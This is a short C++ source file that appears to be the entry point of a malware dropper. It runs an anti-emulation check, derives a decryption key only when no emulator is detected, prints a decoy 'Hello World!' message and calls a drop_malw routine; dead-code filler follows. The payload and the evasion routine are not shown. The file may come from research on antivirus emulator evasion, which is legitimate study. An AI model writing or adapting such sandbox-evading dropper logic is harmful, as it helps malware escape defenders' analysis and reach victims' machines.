#include "../dropmalw/dropmalw.h"
#include <powersetting.h>
#include <iostream>
#include <certsrv.h>

#pragma comment(lib, "Certidl.lib")

int antiemu();

int main(int argc, wchar_t* argv[]) {

  DWORD dwKey = antiemu() > 0 ? 0xdeadbeaf : 0;

  std::cout << "Hello World! Key is 0x" << std::hex << dwKey << "\n";

  if (dwKey != 0) {
    drop_malw(dwKey);
  }

  if (dwKey == 13) {
    // not executed
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0)) {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }
  }
}

